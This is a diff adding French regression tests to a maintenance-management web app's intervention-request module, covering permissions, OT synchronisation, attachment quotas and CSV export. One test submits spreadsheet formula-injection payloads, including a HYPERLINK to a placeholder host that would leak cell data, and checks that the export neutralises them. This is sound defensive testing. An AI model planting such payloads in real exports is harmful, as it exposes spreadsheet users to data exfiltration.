@@ -6,7 +6,9 @@ const { demarrer } = require('./helpers');
 /**
  * Tests du module Demandes d'intervention : CRUD, validation des entrées, droits (403),
  * portée par secteur / perso, circuit de validation (N+1, auto-OT), refus, conversion,
- * clôture par événement OT, commentaires, pièces jointes, export CSV, démo.
+ * clôture par événement OT, commentaires, pièces jointes, export CSV, démo ; non-régression :
+ * réattribution d'une demande (N+1), désignation du demandeur, valideurs en lecture seule, suppression
+ * des pièces jointes, synchronisation DI ↔ OT, formules dans le CSV, lectures sans écriture, quota.
  */
 describe('Demandes d\'intervention', () => {
   let srv, admin, chefProd, chefLog, demandeur, techMaint, resp;
@@ -446,6 +448,242 @@ describe('Demandes d\'intervention', () => {
     assert.equal(v.statut, 'convertie');
     assert.equal(v.validateurId, uChefLog.id);
     assert.equal((await chefLog.get('/api/demandes/' + di1.id)).status, 404, 'les autres demandes PROD restent hors portée');
+  });
+
+  // ----- Non-régression : revue des droits, de la synchronisation OT, des exports et des lectures -----
+  test('validerParSuperieurUniquement : un chef qui n\'est pas le N+1 ne devient pas valideur en réattribuant la demande à son subordonné', async () => {
+    config({ validerParSuperieurUniquement: true });
+    try {
+      // operateur2 (secteur PROD, N+1 = chefLog) : chefProd voit la demande (secteur) mais n'est pas son supérieur
+      const u2 = srv.db.findOne('users', (x) => x.login === 'operateur2');
+      const op2 = srv.client(); await op2.login('operateur2', 'oper1234');
+      const d = await op2.ok('POST', '/api/demandes', { titre: 'Contournement de la validation hiérarchique', equipementId: presse.id });
+      assert.equal((await chefProd.post('/api/demandes/' + d.id + '/valider')).status, 403, 'pas le N+1');
+      const r = await chefProd.put('/api/demandes/' + d.id, { demandeurId: uDemandeur.id });
+      assert.equal(r.status, 403, 'réattribution à son propre subordonné refusée');
+      assert.match(r.body.erreur, /supérieur/);
+      assert.equal(srv.db.get('demandes', d.id).demandeurId, u2.id, 'demandeur inchangé');
+      assert.equal((await chefProd.post('/api/demandes/' + d.id + '/valider')).status, 403, 'toujours pas valideur');
+      assert.equal((await chefProd.put('/api/demandes/' + d.id, { titre: 'Titre corrigé par le chef' })).status, 200, 'les autres champs restent modifiables');
+      // Le supérieur du demandeur actuel change le demandeur : demande d'operateur (N+1 chefProd) réattribuée à operateur3 (N+1 chefProd)
+      const op3 = await admin.ok('POST', '/api/utilisateurs', { login: 'operateur3', nom: 'Opérateur', prenom: 'Nadia', profilId: (await admin.ok('GET', '/api/profils')).find((x) => x.nom === 'Demandeur').id, secteurIds: [PROD], password: 'oper1234', doitChangerMdp: false, managerId: uChefProd.id });
+      const d2 = await demandeur.ok('POST', '/api/demandes', { titre: 'Réattribuée par le N+1', equipementId: presse.id });
+      const r2 = await chefProd.put('/api/demandes/' + d2.id, { demandeurId: op3.id });
+      assert.equal(r2.status, 200, JSON.stringify(r2.body)); assert.equal(r2.body.demandeurId, op3.id, 'le N+1 actuel change le demandeur');
+      // Un administrateur change le demandeur de la première demande : chefProd en devient le N+1 et la valide
+      assert.equal((await admin.put('/api/demandes/' + d.id, { demandeurId: uDemandeur.id })).status, 200, 'administrateur');
+      assert.equal((await chefProd.post('/api/demandes/' + d.id + '/valider')).status, 200, 'chefProd est maintenant le N+1 du demandeur désigné par l\'administrateur');
+    } finally { config({ validerParSuperieurUniquement: false }); }
+  });
+
+  test('désignation d\'un demandeur : compte actif et dans le périmètre de l\'encadrant ; date de demande jamais dans le futur', async () => {
+    const profils = await admin.ok('GET', '/api/profils');
+    const pDemandeur = profils.find((x) => x.nom === 'Demandeur').id;
+    const parti = await admin.ok('POST', '/api/utilisateurs', { login: 'parti', nom: 'Parti', prenom: 'Paul', profilId: pDemandeur, secteurIds: [PROD], password: 'parti1234', doitChangerMdp: false });
+    srv.db.update('users', parti.id, { actif: false });
+    const r1 = await chefProd.post('/api/demandes', { titre: 'Pour un compte désactivé', equipementId: presse.id, demandeurId: parti.id });
+    assert.equal(r1.status, 400); assert.match(r1.body.erreur, /désactivé/);
+    const opLog = await admin.ok('POST', '/api/utilisateurs', { login: 'operateurlog', nom: 'Opérateur', prenom: 'Léa', profilId: pDemandeur, secteurIds: [LOG], password: 'oper1234', doitChangerMdp: false, managerId: uChefLog.id });
+    const r2 = await chefProd.post('/api/demandes', { titre: 'Pour un opérateur d\'un autre secteur', equipementId: presse.id, demandeurId: opLog.id });
+    assert.equal(r2.status, 403); assert.match(r2.body.erreur, /périmètre/);
+    const u2 = srv.db.findOne('users', (x) => x.login === 'operateur2');
+    const r3 = await chefLog.ok('POST', '/api/demandes', { titre: 'Pour mon subordonné d\'un autre secteur', secteurId: LOG, demandeurId: u2.id });
+    assert.equal(r3.demandeurId, u2.id, 'un subordonné direct est toujours désignable');
+    const r4 = await resp.ok('POST', '/api/demandes', { titre: 'Portée tous', secteurId: LOG, demandeurId: opLog.id });
+    assert.equal(r4.demandeurId, opLog.id);
+    const futur = new Date(Date.now() + 86400000).toISOString();
+    const r5 = await chefProd.post('/api/demandes', { titre: 'Datée dans le futur', equipementId: presse.id, dateDemande: futur });
+    assert.equal(r5.status, 400); assert.match(r5.body.erreur, /futur/);
+    const passe = new Date(Date.now() - 2 * 86400000).toISOString();
+    const r6 = await chefProd.ok('POST', '/api/demandes', { titre: 'Saisie différée (papier)', equipementId: presse.id, dateDemande: passe });
+    assert.equal(r6.dateDemande, passe, 'un encadrant date une saisie différée');
+    assert.equal((await chefProd.put('/api/demandes/' + r6.id, { dateDemande: futur })).status, 400, 'ni en modification');
+    const r7 = await demandeur.ok('POST', '/api/demandes', { titre: 'Date imposée ignorée', equipementId: presse.id, dateDemande: passe });
+    assert.notEqual(r7.dateDemande, passe, 'sans le droit modifier, la date envoyée est ignorée');
+    for (const x of [r3, r4, r6, r7]) await admin.ok('DELETE', '/api/demandes/' + x.id);
+  });
+
+  test('un valideur en lecture seule sur le site de la demande n\'est ni valideur, ni notifié, ni compté ; refus explicite', async () => {
+    const profils = await admin.ok('GET', '/api/profils');
+    const siteB = await admin.ok('POST', '/api/secteurs', { nom: 'Usine B', code: 'SITEB', type: 'site' });
+    const atelierB = await admin.ok('POST', '/api/secteurs', { nom: 'Atelier B1', code: 'B1', type: 'atelier', parentId: siteB.id });
+    const eqB = srv.db.insert('equipements', { numero: 'EQ-B001', nom: 'Presse du site B', typeCode: 'machine', etatCode: 'en_service', criticiteCode: 'A', secteurId: atelierB.id, actif: true, documents: [], champs: {}, createdBy: 1 });
+    const uRo = await admin.ok('POST', '/api/utilisateurs', { login: 'chefro', nom: 'Chef', prenom: 'Rose', profilId: profils.find((x) => x.nom === 'Chef de secteur').id, secteurIds: [PROD], siteAcces: [{ siteId: siteB.id, mode: 'lecture' }], password: 'chef1234', doitChangerMdp: false });
+    const uRw = await admin.ok('POST', '/api/utilisateurs', { login: 'chefrw', nom: 'Chef', prenom: 'Rémy', profilId: profils.find((x) => x.nom === 'Chef de secteur').id, secteurIds: [PROD], siteAcces: [{ siteId: siteB.id, mode: 'complet' }], password: 'chef1234', doitChangerMdp: false });
+    const chefRo = srv.client(); await chefRo.login('chefro', 'chef1234');
+    const chefRw = srv.client(); await chefRw.login('chefrw', 'chef1234');
+    const avantRo = notifsDe(uRo.id).length; const avantRw = notifsDe(uRw.id).length;
+    const compteurRo = (await chefRo.ok('GET', '/api/demandes-compteurs')).aValider; const compteurRw = (await chefRw.ok('GET', '/api/demandes-compteurs')).aValider;
+    const d = await admin.ok('POST', '/api/demandes', { titre: 'Demande du site B', equipementId: eqB.id });
+    assert.ok(!d.valideurs.some((u) => u.id === uRo.id), 'lecture seule : pas valideur');
+    assert.ok(d.valideurs.some((u) => u.id === uRw.id), 'accès complet : valideur');
+    assert.equal(notifsDe(uRo.id).length, avantRo, 'lecture seule : non notifié');
+    assert.equal(notifsDe(uRw.id).length, avantRw + 1);
+    const fiche = await chefRo.ok('GET', '/api/demandes/' + d.id);
+    assert.equal(fiche.peutValider, false); assert.equal(fiche.actions.valider, false); assert.equal(fiche.actions.refuser, false);
+    assert.ok(!(await chefRo.ok('GET', '/api/demandes?aValider=1')).some((x) => x.id === d.id));
+    assert.equal((await chefRo.ok('GET', '/api/demandes-compteurs')).aValider, compteurRo, 'lecture seule : non comptée');
+    assert.equal((await chefRw.ok('GET', '/api/demandes-compteurs')).aValider, compteurRw + 1, 'accès complet : comptée');
+    const refus = await chefRo.post('/api/demandes/' + d.id + '/valider');
+    assert.equal(refus.status, 403); assert.match(refus.body.erreur, /lecture seule/);
+    assert.equal((await chefRo.post('/api/demandes/' + d.id + '/commentaires', { texte: 'Depuis un site en lecture seule' })).status, 403);
+    assert.equal((await chefRw.post('/api/demandes/' + d.id + '/valider')).status, 200, 'accès complet : validation');
+  });
+
+  test('pièces jointes : suppression réservée à l\'auteur, aux valideurs et aux administrateurs ; trace dans la chronologie', async () => {
+    const d = await demandeur.ok('POST', '/api/demandes', { titre: 'Pièces jointes croisées', equipementId: presse.id });
+    const pj = (nom) => ({ nom, type: 'text/plain', contenu: 'data:text/plain;base64,' + Buffer.from('contenu ' + nom).toString('base64') });
+    const r1 = await demandeur.ok('POST', `/api/demandes/${d.id}/documents`, pj('constat-operateur.txt'));
+    assert.equal(r1.document.supprimable, true);
+    const r2 = await chefProd.ok('POST', `/api/demandes/${d.id}/documents`, pj('rapport-chef.txt'));
+    assert.deepEqual(r2.pieceJointes.map((p) => p.supprimable), [true, true], 'le chef (valider) peut tout supprimer');
+    const fiche = await demandeur.ok('GET', '/api/demandes/' + d.id);
+    assert.deepEqual(fiche.pieceJointes.map((p) => p.supprimable), [true, false], 'le demandeur ne supprime que la sienne');
+    const refus = await demandeur.del(`/api/demandes/${d.id}/documents/1`);
+    assert.equal(refus.status, 403); assert.match(refus.body.erreur, /que vous avez ajoutées/);
+    assert.equal(srv.db.get('demandes', d.id).pieceJointes.length, 2);
+    const ok = await demandeur.ok('DELETE', `/api/demandes/${d.id}/documents/0`);
+    assert.deepEqual(ok.pieceJointes.map((p) => p.nom), ['rapport-chef.txt']);
+    const ok2 = await admin.ok('DELETE', `/api/demandes/${d.id}/documents/0`);
+    assert.equal(ok2.pieceJointes.length, 0, 'administrateur');
+    const hist = (await admin.ok('GET', '/api/demandes/' + d.id)).historique.filter((h) => h.action === 'pj_supprimee');
+    assert.equal(hist.length, 2);
+    assert.ok(hist[1].commentaire.includes('rapport-chef.txt') && hist[1].commentaire.includes('Paul Chef'), hist[1].commentaire);
+    assert.equal(hist[1].libelle, 'Pièce jointe supprimée');
+  });
+
+  test('synchronisation DI ↔ OT : OT annulé après une clôture automatique, OT réouvert, réouverture d\'une demande', async () => {
+    const emettre = (evt, otId, ancien, nouveau) => srv.ctx.emit(evt, { ot: srv.db.get('ot', otId), ancien, nouveau });
+    const statutOt = (otId, statut) => srv.db.update('ot', otId, { statut });
+    // a) OT terminé → clôture automatique ; la demande ne se réouvre pas tant que l'OT est terminé
+    const a = await demandeur.ok('POST', '/api/demandes', { titre: 'Synchronisation A', equipementId: presse.id });
+    const va = await chefProd.ok('POST', `/api/demandes/${a.id}/valider`);
+    statutOt(va.otId, 'termine'); emettre('ot:termine', va.otId, 'en_cours', 'termine');
+    assert.equal(srv.db.get('demandes', a.id).statut, 'cloturee');
+    const rr = await chefProd.post(`/api/demandes/${a.id}/reouvrir`);
+    assert.equal(rr.status, 400); assert.match(rr.body.erreur, /terminé/);
+    assert.equal(srv.db.get('demandes', a.id).statut, 'cloturee');
+    // OT réouvert (ex. pour compléter le temps passé) : une demande clôturée le reste ; elle peut ensuite être réouverte → convertie
+    statutOt(va.otId, 'en_cours'); emettre('ot:statut', va.otId, 'termine', 'en_cours');
+    assert.equal(srv.db.get('demandes', a.id).statut, 'cloturee', 'la clôture d\'une demande n\'est pas défaite par la seule réouverture de l\'OT');
+    const ra = await chefProd.ok('POST', `/api/demandes/${a.id}/reouvrir`);
+    assert.equal(ra.statut, 'convertie'); assert.equal(ra.otId, va.otId); assert.equal(ra.ot.statut, 'en_cours');
+    statutOt(va.otId, 'termine'); emettre('ot:termine', va.otId, 'en_cours', 'termine');
+    assert.equal(srv.db.get('demandes', a.id).statut, 'cloturee', 'reclôturée automatiquement');
+    // OT réouvert puis annulé : la clôture automatique est défaite, la demande redevient validée sans OT
+    statutOt(va.otId, 'en_cours'); emettre('ot:statut', va.otId, 'termine', 'en_cours');
+    const avantA = notifsDe(uDemandeur.id).length;
+    statutOt(va.otId, 'annule'); emettre('ot:annule', va.otId, 'en_cours', 'annule');
+    const a2 = srv.db.get('demandes', a.id);
+    assert.equal(a2.statut, 'validee'); assert.equal(a2.otId, null); assert.equal(a2.dateCloture, null);
+    assert.ok(a2.historique.some((h) => h.action === 'ot_annule' && /clôture automatique/.test(h.commentaire)));
+    assert.equal(notifsDe(uDemandeur.id).length, avantA + 1);
+    assert.ok(evenements.some((e) => e.evt === 'demande:reouverte' && e.id === a.id));
+    const fa = await chefProd.ok('GET', '/api/demandes/' + a.id);
+    assert.equal(fa.ot, null, 'l\'OT annulé n\'est plus rattaché'); assert.equal(fa.actions.convertir, true);
+    // b) OT annulé puis réouvert : la demande validée redevient convertie
+    const b = await demandeur.ok('POST', '/api/demandes', { titre: 'Synchronisation B', equipementId: presse.id });
+    const vb = await chefProd.ok('POST', `/api/demandes/${b.id}/valider`);
+    statutOt(vb.otId, 'annule'); emettre('ot:annule', vb.otId, 'nouveau', 'annule');
+    assert.equal(srv.db.get('demandes', b.id).statut, 'validee');
+    const avantB = notifsDe(uDemandeur.id).length;
+    statutOt(vb.otId, 'nouveau'); emettre('ot:statut', vb.otId, 'annule', 'nouveau');
+    const b2 = srv.db.get('demandes', b.id);
+    assert.equal(b2.statut, 'convertie'); assert.equal(b2.otId, vb.otId);
+    assert.ok(b2.historique.some((h) => h.action === 'ot_reouvert'));
+    assert.equal(notifsDe(uDemandeur.id).length, avantB + 1, 'demandeur prévenu de la reprise');
+    assert.equal((await chefProd.ok('GET', '/api/demandes/' + b.id)).actions.convertir, false);
+    // Un simple changement de statut entre deux statuts ouverts ne change rien
+    statutOt(vb.otId, 'en_cours'); emettre('ot:statut', vb.otId, 'nouveau', 'en_cours');
+    assert.equal(srv.db.get('demandes', b.id).historique.filter((h) => h.action === 'ot_reouvert').length, 1);
+    // c) Clôture manuelle conservée si l'OT est annulé ensuite ; réouverture → validée sans OT
+    const c = await demandeur.ok('POST', '/api/demandes', { titre: 'Synchronisation C', equipementId: presse.id });
+    const vc = await chefProd.ok('POST', `/api/demandes/${c.id}/valider`);
+    await demandeur.ok('POST', `/api/demandes/${c.id}/cloturer`, { commentaire: 'Problème disparu' });
+    statutOt(vc.otId, 'annule'); emettre('ot:annule', vc.otId, 'nouveau', 'annule');
+    assert.equal(srv.db.get('demandes', c.id).statut, 'cloturee', 'une clôture manuelle n\'est pas défaite');
+    const rc = await chefProd.ok('POST', `/api/demandes/${c.id}/reouvrir`);
+    assert.equal(rc.statut, 'validee'); assert.equal(rc.otId, null); assert.equal(rc.ot, null);
+  });
+
+  test('export CSV : les cellules commençant par =, +, -, @ sont neutralisées (injection de formules), les nombres restent intacts', async () => {
+    const d = await admin.ok('POST', '/api/demandes', { titre: '=HYPERLINK("http://exemple.invalid/?x="&A1;"Cliquez")', description: '@SUM(1+1)*cmd', secteurId: PROD });
+    const d2 = await admin.ok('POST', '/api/demandes', { titre: '-12,5', description: '+33 6 00 00 00 00', secteurId: PROD });
+    const txt = String((await admin.get('/api/demandes-export?statut=soumise')).body);
+    const ligne = txt.split('\r\n').find((l) => l.includes(d.numero));
+    assert.ok(ligne.includes(';"\'=HYPERLINK("'), ligne);
+    assert.ok(ligne.includes(';\'@SUM(1+1)*cmd'), ligne);
+    assert.ok(!/;"?=HYPERLINK/.test(ligne), 'aucune formule exécutable');
+    const ligne2 = txt.split('\r\n').find((l) => l.includes(d2.numero));
+    assert.ok(ligne2.includes(';-12,5;'), 'un nombre négatif reste un nombre : ' + ligne2);
+    assert.ok(ligne2.includes(';\'+33 6'), 'un texte commençant par + est neutralisé : ' + ligne2);
+    await admin.ok('DELETE', '/api/demandes/' + d.id); await admin.ok('DELETE', '/api/demandes/' + d2.id);
+  });
+
+  test('liste, export et fiche : aucune écriture en base pendant une lecture ; OT liés résolus par un index par requête', async () => {
+    // Demande convertie sans lien otId (ancienne base) : l'OT ouvert qui la référence est retrouvé, l'OT passé non
+    const d = srv.db.insert('demandes', { numero: 'DI-SANS-LIEN', titre: 'Lien à retrouver', statut: 'convertie', demandeurId: uDemandeur.id, secteurId: PROD, prioriteCode: 'normale', typeCode: 'correctif', otId: null, pieceJointes: [], commentaires: [], historique: [], champs: {}, createdBy: uDemandeur.id, dateDemande: new Date().toISOString() });
+    const passe = srv.db.insert('ot', { numero: 'OT-PASSE', titre: 'Intervention passée', statut: 'termine', demandeId: d.id, secteurId: PROD, createdBy: 1 });
+    const ot = srv.db.insert('ot', { numero: 'OT-SANS-LIEN', titre: 'Intervention en cours', statut: 'nouveau', demandeId: d.id, secteurId: PROD, createdBy: 1 });
+    const ajoutes = [d.id];
+    for (let i = 0; i < 300; i++) ajoutes.push(srv.db.insert('demandes', { numero: 'DI-VOL-' + i, titre: 'Demande refusée ' + i, statut: 'refusee', demandeurId: uDemandeur.id, secteurId: PROD, prioriteCode: 'normale', typeCode: 'correctif', otId: null, pieceJointes: [], commentaires: [], historique: [], champs: {}, createdBy: uDemandeur.id, dateDemande: new Date().toISOString() }).id);
+    const otAjoutes = [passe.id, ot.id];
+    for (let i = 0; i < 1500; i++) otAjoutes.push(srv.db.insert('ot', { numero: 'OT-VOL-' + i, titre: 'OT ' + i, statut: 'nouveau', demandeId: null, secteurId: PROD, createdBy: 1 }).id);
+    const orig = srv.db.update; let ecritures = 0;
+    srv.db.update = function (...args) { ecritures++; return orig.apply(this, args); };
+    try {
+      const debut = Date.now();
+      const liste = await admin.ok('GET', '/api/demandes');
+      const row = liste.find((x) => x.id === d.id);
+      assert.equal(row.otId, ot.id); assert.equal(row.otNumero, 'OT-SANS-LIEN'); assert.equal(row.otStatut, 'nouveau');
+      const csv = String((await admin.get('/api/demandes-export')).body);
+      assert.ok(csv.includes('DI-SANS-LIEN;') && csv.includes(';OT-SANS-LIEN;'), 'export : OT lié');
+      const fiche = await admin.ok('GET', '/api/demandes/' + d.id);
+      assert.equal(fiche.ot.id, ot.id);
+      assert.ok(Date.now() - debut < 5000, 'liste + export + fiche sur 300 demandes et 1 500 OT en moins de 5 s');
+    } finally { srv.db.update = orig; }
+    assert.equal(ecritures, 0, 'aucune écriture pendant les lectures');
+    assert.equal(srv.db.get('demandes', d.id).otId, null, 'le lien n\'est pas persisté par une lecture');
+    for (const id of ajoutes) srv.db.remove('demandes', id);
+    for (const id of otAjoutes) srv.db.remove('ot', id);
+  });
+
+  test('reprise au démarrage : les liens otId manquants d\'une ancienne base sont complétés une fois', async () => {
+    const fs = require('fs'); const os = require('os'); const path = require('path');
+    const { createApp } = require('../server/server');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gmao-di-'));
+    try {
+      const app1 = createApp({ dataDir: dir, log: () => {} });
+      const di = app1.db.insert('demandes', { numero: 'DI-ANC-1', titre: 'Ancienne convertie', statut: 'convertie', demandeurId: 1, secteurId: null, prioriteCode: 'normale', typeCode: 'correctif', otId: null, pieceJointes: [], commentaires: [], historique: [], champs: {}, createdBy: 1, dateDemande: new Date().toISOString() });
+      const diValidee = app1.db.insert('demandes', { numero: 'DI-ANC-2', titre: 'Ancienne validée (intervention passée)', statut: 'validee', demandeurId: 1, secteurId: null, prioriteCode: 'normale', typeCode: 'correctif', otId: null, pieceJointes: [], commentaires: [], historique: [], champs: {}, createdBy: 1, dateDemande: new Date().toISOString() });
+      const otTermine = app1.db.insert('ot', { numero: 'OT-ANC-1', titre: 'Terminé', statut: 'termine', demandeId: di.id, createdBy: 1 });
+      app1.db.insert('ot', { numero: 'OT-ANC-2', titre: 'Terminé (demande réouverte)', statut: 'termine', demandeId: diValidee.id, createdBy: 1 });
+      app1.db.saveNow();
+      await app1.stop();
+      const app2 = createApp({ dataDir: dir, log: () => {} });
+      try {
+        assert.equal(app2.db.get('demandes', di.id).otId, otTermine.id, 'demande convertie liée à son OT terminé');
+        assert.equal(app2.db.get('demandes', diValidee.id).otId, null, 'demande validée : l\'OT terminé est une intervention passée');
+      } finally { await app2.stop(); }
+    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
+  });
+
+  test('quota global des pièces jointes : dépôt refusé (413) sur une demande, à la création comme en ajout', async () => {
+    const cfg = srv.db.getConfig(); const quotaAvant = cfg.general.quotaPiecesJointesMo;
+    cfg.general.quotaPiecesJointesMo = 50; srv.db.setConfig(cfg);
+    const archive = srv.db.insert('equipements', { nom: 'Archives', documents: [{ nom: 'plans.pdf', contenu: 'data:application/pdf;base64,' + 'A'.repeat(50 * 1024 * 1024) }] });
+    try {
+      const photo = { nom: 'photo.png', type: 'image/png', contenu: 'data:image/png;base64,' + 'B'.repeat(64 * 1024) };
+      const r = await demandeur.post('/api/demandes', { titre: 'Avec photo au-delà du quota', equipementId: presse.id, pieceJointes: [photo] });
+      assert.equal(r.status, 413); assert.match(r.body.erreur, /Espace réservé aux pièces jointes plein/);
+      const d = await demandeur.ok('POST', '/api/demandes', { titre: 'Sans photo (quota plein)', equipementId: presse.id });
+      assert.equal((await demandeur.post(`/api/demandes/${d.id}/documents`, photo)).status, 413);
+      assert.equal(srv.db.get('demandes', d.id).pieceJointes.length, 0);
+      assert.equal((await demandeur.post(`/api/demandes/${d.id}/commentaires`, { texte: 'Sans pièce jointe' })).status, 200, 'les requêtes sans pièce jointe passent');
+    } finally {
+      srv.db.remove('equipements', archive.id);
+      const c2 = srv.db.getConfig(); c2.general.quotaPiecesJointesMo = quotaAvant; srv.db.setConfig(c2);
+    }
   });
 
   test('statuts configurables : codes renommés résolus depuis la liste statutsDemande', async () => {
